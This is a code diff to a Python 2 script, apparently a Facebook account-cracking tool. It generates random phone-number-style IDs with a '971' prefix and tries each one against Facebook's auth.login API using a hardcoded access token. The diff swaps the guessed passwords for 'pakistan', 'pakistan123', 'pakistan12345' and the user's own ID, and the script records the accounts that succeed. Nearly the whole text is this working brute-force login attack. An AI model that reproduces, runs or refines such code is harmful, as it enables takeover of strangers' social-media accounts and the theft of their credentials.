@@ -6,7 +6,7 @@ import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,ge
 os.system('rm -rf .txt')
 for n in range(10000):
 
-    nmbr = random.randint(2000000, 2999999)
+    nmbr = random.randint(10000000, 99999999)
     
     sys.stdout = open('.txt', 'a')
 
@@ -112,10 +112,10 @@ def action():
     elif bch =="1":
         os.system("clear")
         print (logo)
-        print("\033[1;93m175,.,191, 0000, 193, 194, 195, 196, 197, 198, 199")
+        print("\033[1;93m175,.,191, 5, 193, 194, 195, 196, 197, 198, 199")
         try:
             c = raw_input("\033[1;96m choose code  : ")
-            k=""
+            k="971"
             idlist = ('.txt')
             for line in open(idlist,"r").readlines():
                 id.append(line.strip())
@@ -305,7 +305,7 @@ def action():
 		except OSError:
 			pass
 		try:
-			pass1="password@12345"
+			pass1 = user
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
@@ -322,7 +322,7 @@ def action():
 					cps.close()
 					cpb.append(c+user+pass1)
  				else:
- 				    pass2="password@1"
+ 				    pass2="pakistan"
  				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				    q = json.load(data)
  				    if 'access_token' in q:
@@ -339,7 +339,7 @@ def action():
  					        cps.close()
  					        cpb.append(c+user+pass2)
                                         else:
- 				            pass3="password@123"
+ 				            pass3="pakistan123"
  				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				            q = json.load(data)
  				            if 'access_token' in q:
@@ -356,7 +356,7 @@ def action():
  					                cps.close()
  					                cpb.append(c+user+pass3)
                                                 else:
- 				                    pass4="password"
+ 				                    pass4="pakistan12345"
  				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				                    q = json.load(data)
  				                    if 'access_token' in q:
